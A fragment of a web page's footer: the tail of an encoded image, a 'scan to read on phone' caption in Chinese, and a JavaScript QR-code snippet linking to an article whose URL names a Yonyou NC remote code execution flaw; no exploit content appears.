E11vyBPBQT1/PbOuDkR0kfe69UL9cTSZgvSs+cgeq8xJ+pD8uqifkf9ru/5jweyb3Zd//wEfjwQyFMCQbfk0wDR5foQfcXVO0Lqer/KQby6rmUGokOwvNky3z14Xmce/l0OUgdcn9RvH/Z1eEN8Sjqu9r3KQabe62Cu91zvC2MdhPdccYgHQXuXt18w+hAOQbPWixC/c/Oivgip67688DAQiy98zwlsA4FMD57japuQujO/noJa5mCsg3AYsWpmyz6FkBpzpdWSQ3wIlvdswZiDcPtZK4f46qK+qC5C6oDrZ8jtw762N+TD9vV/u53/AAAA///dZL4UAAAABklEQVQDAGMKs9o7iHDkAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-ContactsQueryServiceServlet-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 